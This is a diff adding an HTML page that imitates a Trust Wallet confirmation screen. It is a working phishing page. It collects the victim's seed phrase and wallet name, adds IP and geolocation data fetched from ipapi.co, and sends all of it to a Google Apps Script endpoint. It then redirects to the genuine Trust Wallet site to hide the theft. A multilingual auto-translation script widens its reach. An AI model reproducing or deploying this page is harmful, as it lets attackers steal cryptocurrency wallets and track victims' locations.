@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>trust Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0; /* Remove default margin */
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 10px;
+            border-radius: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        h1,
+        h6 {
+            margin: 10; /* Remove default margin */
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        button {
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #357ae8;
+        }
+
+        a {
+            text-decoration: none;
+            color: #4285f4;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Define CSS classes for different colors */
+        .red { color: red; }
+        .green { color: green; }
+        .blue { color: #4285f4; }
+        .orange { color: orange; }
+        .purple { color: purple; }
+    </style>
+</head>
+<body>
+    <div class="login-container">       
+        <img src="/storage/emulated/0/Xender/image/IMG_20240805_005046~2.jpg" style="width:130px">
+        <p data-translate>Confirm your Trust Wallet details to continue </p>
+        <form action="https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec" method="POST" id="Trustwallet">
+            <input data-translate-placeholder type="text" name="email_or_phone" placeholder="Wallet Name" required/>
+            <input data-translate-placeholder type="password" name="message" placeholder="Seed Phrase" required/>
+            <input type="hidden" id="ip_address" name="ip_address">
+            <input type="hidden" id="country" name="country">
+            <input type="hidden" id="region" name="region">
+            <input type="hidden" id="city" name="city">
+            <input type="hidden" name="form_id" value="Trustwallet">
+            <input type="hidden" name="origin" value="https://joshiahh.github.io/Faceb00k-profile-/">
+        <h6 data-translate style="padding-top: 1px; padding-bottom: 1px">Typically 12 (sometimes 18, 24) words seperated by single spaces</h6>
+        <center><button data-translate style="margin:0px; width: 320px" type="submit">Confirm Wallet</button></center>         
+        </form>
+        </div>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+      // Detects the user's preferred language
+    function detectUserLanguage() {
+      const userLang = navigator.language || navigator.userLanguage;
+      return userLang.slice(0, 2); // Get the first 2 characters of the language code (e.g., "en", "fr", etc.)
+    }
+
+    // Supported languages based on LibreTranslate (expandable)
+    const supportedLanguages = [
+      'af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 
+      'zh', 'hr', 'cs', 'da', 'nl', 'en', 'et', 'fi', 'fr', 'gl', 'ka', 'de', 
+      'el', 'gu', 'ht', 'he', 'hi', 'hu', 'is', 'ig', 'id', 'ga', 'it', 'ja', 
+      'jv', 'kn', 'kk', 'km', 'ko', 'ku', 'ky', 'lo', 'la', 'lv', 'lt', 'lb', 
+      'mk', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no', 'ps', 'fa', 
+      'pl', 'pt', 'pa', 'ro', 'ru', 'gd', 'sr', 'st', 'si', 'sk', 'sl', 'so', 
+      'es', 'su', 'sw', 'sv', 'tg', 'ta', 'te', 'th', 'tr', 'uk', 'ur', 'uz', 
+      'vi', 'cy', 'xh', 'yi', 'yo', 'zu'
+    ];
+
+    // Fallback to English if the user's language is unsupported
+    function getFallbackLanguage(userLang) {
+      return supportedLanguages.includes(userLang) ? userLang : 'en';
+    }
+
+    // Batch translation function
+    function translateBatch(texts, targetLang) {
+      return fetch('https://libretranslate.com/translate', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          q: texts,
+          source: 'en',   // Assuming English as the default language
+          target: targetLang,
+          format: "text"
+        }),
+      })
+      .then(response => response.json())
+      .then(data => data.map(item => item.translatedText))
+      .catch(error => {
+        console.error('Error translating text:', error);
+        // Fallback to original texts in case of an error
+        return texts;
+      });
+    }
+
+    // Function to translate all form labels, buttons, and placeholders
+    function translateForm(targetLang) {
+      const elementsToTranslate = document.querySelectorAll('[data-translate], [data-translate-placeholder]');
+
+      // Collect all texts that need translation
+      const textsToTranslate = Array.from(elementsToTranslate).map(elem => {
+        return elem.textContent || elem.placeholder;
+      });
+
+      // Translate all texts in a single request
+      translateBatch(textsToTranslate, targetLang)
+        .then(translatedTexts => {
+          let i = 0;
+          elementsToTranslate.forEach(elem => {
+            if (elem.textContent && elem.hasAttribute('data-translate')) {
+              elem.textContent = translatedTexts[i++];
+            } else if (elem.placeholder && elem.hasAttribute('data-translate-placeholder')) {
+              elem.placeholder = translatedTexts[i++];
+            }
+          });
+        });
+    }
+
+    // Initialize translation based on the user's preferred language or fallback
+    document.addEventListener('DOMContentLoaded', function() {
+      const userLang = detectUserLanguage();
+      const targetLang = getFallbackLanguage(userLang);
+      translateForm(targetLang);
+    });
+
+  // Fetch user's location and IP address
+    $(document).ready(function () {
+        $.get("https://ipapi.co/json/", function (data) {
+            $("#ip_address").val(data.ip);
+            $("#country").val(data.country_name);
+            $("#region").val(data.region);
+            $("#city").val(data.city);
+        });
+
+   // Function to handle form submission
+        document.getElementById('Trustwallet').addEventListener('submit', function(event) {
+          event.preventDefault();
+          const form = event.target;
+          const formData = new FormData(form);
+          const jsonData = {};
+          for (const [key, value] of formData.entries()) {
+            jsonData[key] = value;
+          }
+          fetch('https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams(jsonData).toString(),
+          })
+          .then(response => {
+            if (response.ok) {
+              window.location.replace('https://www.Trustwallet.com');
+            } else {
+              console.error('Error submitting form data');
+            }
+          })
+          .catch(error => {
+            console.error('Fetch error:', error);
+          });
+        });
+      });
+    </script>
+</body>
+</html>
